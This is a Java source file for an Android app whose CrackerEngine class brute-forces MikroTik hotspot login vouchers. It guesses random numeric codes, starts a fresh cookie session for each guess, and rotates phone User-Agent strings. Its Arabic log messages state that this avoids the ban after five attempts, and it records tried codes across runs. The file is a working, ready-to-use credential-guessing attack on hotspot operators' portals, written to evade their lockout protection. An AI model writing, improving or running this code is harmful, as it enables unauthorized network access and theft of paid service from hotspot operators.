package com.example.mikrotikbrowser;

import android.content.SharedPreferences;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.atomic.*;
import org.json.JSONObject;

public class CrackerEngine {
    public interface Listener {
        void onLog(String msg);
        void onProgress(int cur, int total, String voucher);
        void onFound(String voucher, String status);
    }

    private final Listener listener;
    private final SharedPreferences prefs;
    private final String network;
    private final String loginUrl, statusUrl, baseUrl;
    private final String prefix, suffix;
    private final int digits, maxAttempts, pauseMs, retryDelay;

    private final AtomicBoolean stopped = new AtomicBoolean(false);
    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicInteger done = new AtomicInteger(0);
    private final Set<String> tried;
    private final Random rng = new Random();
    private Thread workerThread;

    public CrackerEngine(Listener l, SharedPreferences p, String network,
                         String loginUrl, String prefix, String suffix, int digits,
                         int maxAttempts, int pauseMs, int retryDelay) {
        this.listener = l; this.prefs = p; this.network = network;
        this.loginUrl = loginUrl;
        try {
            this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
        } catch (Exception e) { throw new RuntimeException("bad url"); }
        this.statusUrl = baseUrl + "/status?var=callBack";
        this.prefix = prefix != null ? prefix : "";
        this.suffix = suffix != null ? suffix : "";
        this.digits = digits; this.maxAttempts = maxAttempts;
        this.pauseMs = Math.max(200, pauseMs);
        this.retryDelay = retryDelay;
        this.tried = Collections.synchronizedSet(loadTried());
    }

    private Set<String> loadTried() {
        Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
        if (s.size() > 50000) {
            List<String> l = new ArrayList<>(s);
            s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
        }
        return s;
    }

    public void stop() {
        stopped.set(true);
        if (workerThread != null) workerThread.interrupt();
    }

    public void start() {
        workerThread = new Thread(this::runEngine, "CrackerMain");
        workerThread.start();
    }

    private void runEngine() {
        try {
            log("▶ بدء التخمين — جلسة جديدة لكل محاولة");
            log("  (هذا يتجنب الحظر بعد 5 محاولات)");

            log("→ تسجيل خروج لبدء نظيف...");
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/logout?erase-cookie=yes&var=callBack").openConnection();
                c.setConnectTimeout(3000); c.setReadTimeout(3000);
                c.getResponseCode();
                c.disconnect();
            } catch (Exception e) {}
            sleep(1500);

            log("  أرقام مجربة سابقاً: " + tried.size());

            int consecutiveBusy = 0;

            while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
                String v = generate();
                if (v == null) { log("⚠ نفدت الأرقام"); break; }
                int cur = done.incrementAndGet();
                listener.onProgress(cur, maxAttempts, v);
                log("🔍 " + v);

                Result r = tryFreshSession(v);
                if (stopped.get() || found.get()) break;

                if (r.busy) {
                    consecutiveBusy++;
                    log("  ⏳ الراوتر مشغول، انتظار " + (retryDelay/1000) + "s");
                    if (consecutiveBusy >= 3) {
                        log("  🛑 مشغول 3 مرات — انتظار أطول...");
                        sleep(retryDelay * 2);
                        consecutiveBusy = 0;
                    } else {
                        sleep(retryDelay);
                    }
                    continue;
                }
                consecutiveBusy = 0;

                if (r.error != null && !r.error.equals("stopped")) {
                    log("  ❌ " + v + " → " + r.error);
                }

                if (r.success) {
                    found.set(true);
                    log("✅✅✅ وجد الكرت: " + v);
                    listener.onFound(v, r.statusJson);
                    return;
                }

                sleep(pauseMs);
            }

            if (!found.get() && !stopped.get())
                log("❌ انتهى — " + done.get() + " محاولة");
        } catch (Exception e) {
            log("❌ خطأ: " + e.getMessage());
        }
    }

    private Result tryFreshSession(String voucher) {
        if (stopped.get()) return Result.bad("stopped");
        Map<String, String> cookies = new HashMap<>();
        String ua = ua();

        try {
            // 1. صفحة البداية (كوكيز جديدة)
            HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
            c1.setConnectTimeout(5000); c1.setReadTimeout(5000);
            c1.setRequestProperty("User-Agent", ua);
            c1.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            c1.setRequestProperty("Accept-Language", "ar,en;q=0.9");
            c1.getResponseCode();
            extractCookies(c1, cookies);
            c1.disconnect();
            if (stopped.get()) return Result.bad("stopped");

            // 2. الفورم
            HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
            c2.setConnectTimeout(5000); c2.setReadTimeout(5000);
            c2.setRequestProperty("User-Agent", ua);
            c2.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            c2.setRequestProperty("Accept-Language", "ar,en;q=0.9");
            String ck1 = cookiesStr(cookies);
            if (!ck1.isEmpty()) c2.setRequestProperty("Cookie", ck1);
            String html = read(c2.getInputStream());
            extractCookies(c2, cookies);
            c2.disconnect();
            if (stopped.get()) return Result.bad("stopped");

            Map<String, String> fields = extractFields(html);
            if (fields == null) return Result.bad("لا يوجد form في الصفحة");
            fields.put("username", voucher);
            fields.put("password", "");

            // 3. إرسال
            HttpURLConnection c3 = (HttpURLConnection) new URL(loginUrl).openConnection();
            c3.setRequestMethod("POST");
            c3.setDoOutput(true);
            c3.setInstanceFollowRedirects(false);
            c3.setConnectTimeout(8000); c3.setReadTimeout(8000);
            c3.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c3.setRequestProperty("User-Agent", ua);
            c3.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            c3.setRequestProperty("Accept-Language", "ar,en;q=0.9");
            c3.setRequestProperty("Referer", loginUrl);
            c3.setRequestProperty("Origin", baseUrl);
            String ck2 = cookiesStr(cookies);
            if (!ck2.isEmpty()) c3.setRequestProperty("Cookie", ck2);

            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> e : fields.entrySet()) {
                if (sb.length() > 0) sb.append("&");
                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
                  .append("=")
                  .append(URLEncoder.encode(e.getValue(), "UTF-8"));
            }
            OutputStream os = c3.getOutputStream();
            os.write(sb.toString().getBytes("UTF-8"));
            os.flush(); os.close();

            int code = c3.getResponseCode();
            extractCookies(c3, cookies);
            String body = "";
            try {
                InputStream is = (code >= 400) ? c3.getErrorStream() : c3.getInputStream();
                if (is != null) body = read(is);
            } catch (Exception e) {}
            c3.disconnect();
            if (stopped.get()) return Result.bad("stopped");

            String lowBody = body.toLowerCase();
            if (body.contains("already authorizing") || lowBody.contains("already authorizing")) {
                return Result.busy("already authorizing");
            }
            if (lowBody.contains("invalid") || lowBody.contains("error")
                || lowBody.contains("wrong") || lowBody.contains("denied")) {
                String msg = extractErr(body);
                return Result.bad(msg != null ? msg : "خاطئ");
            }

            // 4. تحقق
            sleep(100);
            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
            c4.setConnectTimeout(5000); c4.setReadTimeout(5000);
            c4.setRequestProperty("User-Agent", ua);
            String ck3 = cookiesStr(cookies);
            if (!ck3.isEmpty()) c4.setRequestProperty("Cookie", ck3);
            String statusBody = read(c4.getInputStream());
            c4.disconnect();

            JSONObject o = new JSONObject(statusBody);
            String li = o.optString("logged_in", "").toLowerCase();
            String un = o.optString("username", "").trim();
            if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
                return Result.ok(statusBody);
            return Result.bad(null);

        } catch (Exception e) {
            return Result.bad("network: " + e.getMessage());
        }
    }

    private Map<String, String> extractFields(String html) {
        Map<String, String> fields = new LinkedHashMap<>();
        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
            java.util.regex.Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher m = p.matcher(html);
        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
        if (fields.isEmpty()) return null;
        fields.putIfAbsent("username", "");
        fields.putIfAbsent("password", "");
        fields.putIfAbsent("dst", baseUrl + "/");
        return fields;
    }

    private static class Result {
        boolean success, busy; String error; String statusJson;
        static Result ok(String j) { Result r = new Result(); r.success = true; r.statusJson = j; return r; }
        static Result bad(String e) { Result r = new Result(); r.error = e; return r; }
        static Result busy(String e) { Result r = new Result(); r.busy = true; r.error = e; return r; }
    }

    private String generate() {
        int max = (int) Math.pow(10, digits) - 1;
        for (int k = 0; k < 500; k++) {
            int num = rng.nextInt(max + 1);
            String v = prefix + String.format(java.util.Locale.US, "%0" + digits + "d", num) + suffix;
            if (tried.add(v)) {
                synchronized (prefs) {
                    Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
                    s.add(v);
                    if (s.size() > 50000) {
                        List<String> l = new ArrayList<>(s);
                        s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
                    }
                    prefs.edit().putStringSet("tried_" + network, s).apply();
                }
                return v;
            }
        }
        return null;
    }

    private void extractCookies(HttpURLConnection c, Map<String, String> store) {
        Map<String, List<String>> h = c.getHeaderFields();
        for (Map.Entry<String, List<String>> e : h.entrySet()) {
            if (e.getKey() != null && e.getKey().equalsIgnoreCase("Set-Cookie")) {
                for (String line : e.getValue()) {
                    int eq = line.indexOf('=');
                    if (eq < 0) continue;
                    int semi = line.indexOf(';', eq);
                    String n = line.substring(0, eq).trim();
                    String v = semi > 0 ? line.substring(eq + 1, semi).trim() : line.substring(eq + 1).trim();
                    store.put(n, v);
                }
            }
        }
    }

    private String cookiesStr(Map<String, String> store) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : store.entrySet()) {
            if (sb.length() > 0) sb.append("; ");
            sb.append(e.getKey()).append("=").append(e.getValue());
        }
        return sb.toString();
    }

    private String extractErr(String html) {
        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
            "class=[\"'][^\"']*(?:error|alert|fail|warn)[^\"']*[\"'][^>]*>([^<]+)<",
            java.util.regex.Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher m = p.matcher(html);
        return m.find() ? m.group(1).trim() : null;
    }

    private String ua() {
        String[] a = {
            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
        };
        return a[rng.nextInt(a.length)];
    }

    private String read(InputStream is) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) > 0) b.write(buf, 0, n);
        return b.toString("UTF-8");
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
    private void log(String m) { listener.onLog(m); }
}
